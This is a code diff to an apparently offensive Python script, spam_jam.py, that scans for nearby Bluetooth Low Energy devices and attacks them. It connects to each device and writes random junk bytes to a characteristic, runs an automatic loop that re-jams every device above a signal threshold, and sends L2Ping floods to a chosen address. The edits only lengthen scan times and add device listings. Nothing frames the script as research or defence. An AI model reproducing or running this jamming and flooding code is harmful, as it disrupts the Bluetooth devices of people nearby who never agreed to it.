@@ -1,3 +1,4 @@
+# [start of script]
 import os
 import sys
 import time
@@ -60,7 +61,7 @@ def spam_all_ble():
     print("🔎 Scanning for BLE devices to spam 📡")
     scanner = Scanner()
     try:
-        devices = scanner.scan(10.0)
+        devices = scanner.scan(15.0)  # ⬅️ Longer scan time
     except BTLEException as e:
         print(f"⚠️ Scan failed: {e}")
         return
@@ -81,7 +82,7 @@ def spam_all_ble():
         except Exception as e:
             print(f"⚠️ Could not spam {device.addr}: {e}")
 
-# 🚫 Jam Single BLE Device (Enhanced, FIXED)
+# 🚫 Jam Single BLE Device
 def jam_ble():
     print("🔎 Resetting BLE scan before jamming...")
     subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -92,8 +93,8 @@ def jam_ble():
     while True:
         scanner = Scanner()
         try:
-            devices = scanner.scan(10.0)
-            device_list = list(devices)  # ✅ FIXED
+            devices = scanner.scan(15.0)
+            device_list = list(devices)
         except BTLEException as e:
             print(f"⚠️ BLE Scan Failed: {e}")
             continue
@@ -107,7 +108,7 @@ def jam_ble():
 
         try:
             idx = int(input("💜 Enter index of device to jam: "))
-            target = device_list[idx].addr  # ✅ FIXED
+            target = device_list[idx].addr
         except (ValueError, IndexError):
             print("⚠️ Invalid choice.")
             continue
@@ -126,7 +127,7 @@ def jam_ble():
             if retry != 'y':
                 break
 
-# 🚫 Jam All BLE Devices — AUTO RE-SCAN + RSSI FILTER EDITION
+# 🚫 Jam All BLE Devices — AUTO RE-SCAN + RSSI + CLASSIC SCAN
 def jam_all_ble():
     print("🔎 Starting auto-rejam loop 📡")
     try:
@@ -140,35 +141,39 @@ def jam_all_ble():
             print("\n🔁 Scanning for BLE devices to jam...")
             scanner = Scanner()
             try:
-                devices = scanner.scan(10.0)
+                devices = scanner.scan(15.0)
             except BTLEException as e:
-                print(f"⚠️ Scan failed: {e}")
+                print(f"⚠️ BLE Scan failed: {e}")
                 continue
+
+            print("🔍 Detected BLE devices:")
+            for dev in devices:
+                print(f"  • {dev.addr} RSSI={dev.rssi} dB")
 
             jam_targets = [dev for dev in devices if dev.rssi >= min_rssi]
 
             if not jam_targets:
                 print("⚠️ No targets found above threshold. Retrying...")
-                time.sleep(5)
-                continue
-
-            for device in jam_targets:
-                try:
-                    print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
-                    peripheral = Peripheral(device.addr)
-                    junk = os.urandom(random.randint(20, 50))
-                    peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
-                    peripheral.disconnect()
-                    time.sleep(random.uniform(0.05, 0.2))
-                except Exception as e:
-                    print(f"⚠️ Skipped {device.addr}: {e}")
+            else:
+                for device in jam_targets:
+                    try:
+                        print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
+                        peripheral = Peripheral(device.addr)
+                        junk = os.urandom(random.randint(20, 50))
+                        peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
+                        peripheral.disconnect()
+                        time.sleep(random.uniform(0.05, 0.2))
+                    except Exception as e:
+                        print(f"⚠️ Skipped {device.addr}: {e}")
 
             print("🔁 Waiting 5 seconds before next scan...")
             time.sleep(5)
 
+            print("🤖 Also checking for classic Bluetooth devices...")
+            subprocess.run(["hcitool", "scan"])
+
     except KeyboardInterrupt:
         print("\n🛑 Auto re-jam stopped by user.")
-
 
 # 🔎 Bluetooth Scanner
 def scan_bluetooth():
@@ -190,7 +195,7 @@ def l2ping_attack():
     while True:
         addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
         if os.geteuid() != 0:
-            print("⚠️  L2Ping needs root! Try: sudo python3 spam_jam.py")
+            print("⚠️ L2Ping needs root! Try: sudo python3 spam_jam.py")
             return
         print(f"💥 Sending L2Ping flood to {addr}")
         try:
